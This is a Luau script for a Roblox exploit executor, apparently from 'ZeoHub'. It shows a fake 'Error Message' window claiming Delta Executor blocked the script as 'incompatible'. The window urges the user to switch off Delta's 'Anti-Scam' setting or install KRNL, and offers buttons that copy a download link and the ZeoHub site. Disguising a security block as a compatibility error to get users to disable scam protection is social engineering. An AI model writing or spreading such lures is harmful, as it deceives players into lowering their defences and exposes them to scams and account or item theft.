task.spawn(function()
    local TILE_IMAGE = "rbxassetid://15910695828"
    local FONT = Enum.Font.FredokaOne

    local ACCENT_GREEN = Color3.fromRGB(110, 196, 99)
    local BROWN = Color3.fromRGB(118, 61, 25)
    local DARK_BROWN = Color3.fromRGB(51, 25, 0)
    local RED = Color3.fromRGB(255, 62, 62)
    local BLUE = Color3.fromRGB(30, 144, 255)

    local gui = Instance.new("ScreenGui")
    gui.Name = "DeltaWarnUI"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = game:GetService("CoreGui")

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0.3, 0, 0.3, 0)
    frame.Position = UDim2.new(0.35, 0, 0.35, 0)
    frame.BackgroundColor3 = BROWN
    frame.Active = true
    frame.Draggable = true
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
    Instance.new("UIStroke", frame).Color = DARK_BROWN

    local texture = Instance.new("ImageLabel", frame)
    texture.Size = UDim2.new(1, 0, 1, 0)
    texture.BackgroundTransparency = 1
    texture.Image = TILE_IMAGE
    texture.ScaleType = Enum.ScaleType.Tile
    texture.TileSize = UDim2.new(0, 96, 0, 96)

    -- Top bar
    local topBar = Instance.new("Frame", frame)
    topBar.Size = UDim2.new(1, 0, 0, 0.1)
    topBar.BackgroundColor3 = ACCENT_GREEN
    Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 16)
    topBar.ClipsDescendants = true

    local greenTexture = Instance.new("ImageLabel", topBar)
    greenTexture.Size = UDim2.new(1, 0, 1, 0)
    greenTexture.BackgroundTransparency = 1
    greenTexture.Image = TILE_IMAGE
    greenTexture.ScaleType = Enum.ScaleType.Tile
    greenTexture.TileSize = UDim2.new(0, 96, 0, 96)

    local title = Instance.new("TextLabel", topBar)
    title.Size = UDim2.new(0.92, 0, 1, 0)
    title.Position = UDim2.new(0.03, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Font = FONT
    title.Text = "Error Message"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextScaled = true
    title.TextXAlignment = Enum.TextXAlignment.Left

    local close = Instance.new("TextButton", topBar)
    close.Size = UDim2.new(0.06, 0, 0.8, 0)
    close.Position = UDim2.new(0.92, 0, 0.1, 0)
    close.BackgroundColor3 = RED
    close.Font = FONT
    close.Text = "X"
    close.TextColor3 = Color3.new(1, 1, 1)
    close.TextScaled = true
    Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
    Instance.new("UIStroke", close).Color = DARK_BROWN
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Main message
    local message = Instance.new("TextLabel", frame)
    message.Size = UDim2.new(0.94, 0, 0.55, 0)
    message.Position = UDim2.new(0.03, 0, 0.12, 0)
    message.BackgroundTransparency = 1
    message.Font = FONT
    message.TextColor3 = Color3.new(1, 1, 1)
    message.TextStrokeTransparency = 0.3
    message.TextScaled = true
    message.TextWrapped = true
    message.TextYAlignment = Enum.TextYAlignment.Top
    message.Text = [[Delta Executor detected.

This executor blocked the script because it's incompatible.

To fix this:
‚Ä¢ Turn OFF Delta's 'Anti-Scam' setting
‚Ä¢ Or switch to a compatible executor like KRNL

ZeoHub recommends KRNL for best results.]]

    -- KRNL button
    local copyBtn = Instance.new("TextButton", frame)
    copyBtn.Size = UDim2.new(0.9, 0, 0.11, 0)
    copyBtn.Position = UDim2.new(0.05, 0, 0.7, 0)
    copyBtn.BackgroundColor3 = BLUE
    copyBtn.Font = FONT
    copyBtn.Text = "üîó Copy KRNL Link"
    copyBtn.TextColor3 = Color3.new(1, 1, 1)
    copyBtn.TextScaled = true
    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", copyBtn).Color = DARK_BROWN

    copyBtn.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard("https://krnl.place/")
            copyBtn.Text = "‚úÖ Link Copied"
            task.wait(2)
            copyBtn.Text = "üîó Copy KRNL Link"
        end
    end)

    -- Website copy button
    local siteBtn = Instance.new("TextButton", frame)
    siteBtn.Size = UDim2.new(0.9, 0, 0.11, 0)
    siteBtn.Position = UDim2.new(0.05, 0, 0.83, 0)
    siteBtn.BackgroundColor3 = ACCENT_GREEN
    siteBtn.Font = FONT
    siteBtn.Text = "üåê Copy ZeoHub Website"
    siteBtn.TextColor3 = Color3.new(1, 1, 1)
    siteBtn.TextScaled = true
    Instance.new("UICorner", siteBtn).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", siteBtn).Color = DARK_BROWN

    siteBtn.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard("https://zeohubweb.vercel.app/")
            siteBtn.Text = "‚úÖ Link Copied"
            task.wait(2)
            siteBtn.Text = "üåê Copy ZeoHub Website"
        end
    end)
end)
